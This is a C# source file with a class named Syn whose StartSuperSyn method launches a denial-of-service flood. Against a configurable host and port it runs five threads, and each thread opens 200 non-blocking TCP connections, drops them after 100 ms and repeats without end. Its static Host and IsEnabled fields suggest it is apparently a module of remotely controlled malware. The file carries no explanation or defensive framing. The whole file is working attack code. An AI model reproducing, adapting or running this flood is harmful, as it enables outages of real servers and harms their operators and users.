﻿using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace myApp
{
    internal class Syn
    {
        private static ThreadStart[] _floodingJob;
        private static Thread[] _floodingThread;
        private static IPEndPoint _ipEo;
        private static SendSyn[] _synClass;
        public static string Host;
        public static bool IsEnabled;
        public static int Port = 80;
        public static int SuperSynSockets = 200;
        public static int Threads = 5;

        public static void StartSuperSyn()
        {
            try
            {
                IPAddress[] addressList = Dns.GetHostEntry(Host).AddressList;
                _ipEo = new IPEndPoint(addressList[0], Port);
            }
            catch
            {
                IPAddress address = IPAddress.Parse(Host);
                _ipEo = new IPEndPoint(address, Port);
            }
            _floodingThread = new Thread[Threads];
            _floodingJob = new ThreadStart[Threads];
            _synClass = new SendSyn[Threads];
            for (int i = 0; i < Threads; i++)
            {
                _synClass[i] = new SendSyn(_ipEo, SuperSynSockets);
                _floodingJob[i] = new ThreadStart(_synClass[i].Send);
                _floodingThread[i] = new Thread(_floodingJob[i]);
                _floodingThread[i].Start();
            }
            IsEnabled = true;
        }

        public static void StopSuperSyn()
        {
            for (int i = 0; i < Threads; i++)
            {
                try
                {
                    _floodingThread[i].Abort();
                    _floodingThread[i] = null;
                    _floodingJob[i] = null;
                    _synClass[i] = null;
                }
                catch
                {
                }
            }
            IsEnabled = false;
        }

        #region Nested type: SendSyn

        private class SendSyn
        {
            private Socket[] _sock;
            private IPEndPoint ipEo;
            private int SuperSynSockets;

            public SendSyn(IPEndPoint ipEo, int superSynSockets)
            {
                this.ipEo = ipEo;
                SuperSynSockets = superSynSockets;
            }

            private static void OnConnect(IAsyncResult ar)
            {
            }

            public void Send()
            {
                while (true)
                {
                    int num;
                    try
                    {
                        _sock = new Socket[SuperSynSockets];
                        for (num = 0; num < SuperSynSockets; num++)
                        {
                            _sock[num] = new Socket(ipEo.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                            _sock[num].Blocking = false;
                            AsyncCallback callback = OnConnect;
                            _sock[num].BeginConnect(ipEo, callback, _sock[num]);
                        }
                        Thread.Sleep(100);
                        for (num = 0; num < SuperSynSockets; num++)
                        {
                            if (_sock[num].Connected)
                            {
                                _sock[num].Disconnect(false);
                            }
                            _sock[num].Close();
                            _sock[num] = null;
                        }
                        _sock = null;
                    }
                    catch
                    {
                        for (num = 0; num < SuperSynSockets; num++)
                        {
                            try
                            {
                                if (_sock != null)
                                {
                                    if (_sock[num].Connected)
                                    {
                                        _sock[num].Disconnect(false);
                                    }
                                    _sock[num].Close();
                                    _sock[num] = null;
                                }
                            }
                            catch
                            {
                            }
                        }
                    }
                }
            }
        }

        #endregion
    }
}